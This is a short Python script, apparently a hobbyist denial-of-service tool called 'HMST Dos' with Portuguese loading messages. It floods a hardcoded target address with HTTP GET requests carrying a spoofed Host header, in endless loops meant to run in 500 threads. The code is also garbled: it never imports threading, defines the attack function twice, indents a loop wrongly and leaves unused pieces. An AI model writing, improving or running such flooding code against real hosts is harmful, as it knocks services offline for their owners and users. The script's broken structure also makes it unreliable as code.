import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system ("clear")
os.system("figlet HMST Dos")
print
print ("Dono: Hamster")
print ("☠️")
print ("Instagram : @hamster.py")
print ("With great power comes great responsibility.")
ip = input("IP : ")
port  = input("Port IP   :")

os.system("clear")
os.system("figlet HMSTLOL")
print ("[+]--Carregando>                           [+]0% ")
time.sleep(5)
print ("[+]-- Carregando>                          [+]25% ")
time.sleep(5)
print ("[+]--Carregando>                          [+]50% ")
time.sleep(5)
print ("[+]--Carregando>                          [+]75% ")
print ("[+]--Carregando>                           [+]100% ")
time.sleep(5)
sent = 0

target = '10.0.0.138'
fake_ip = '182.21.20.32'
port = 80
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()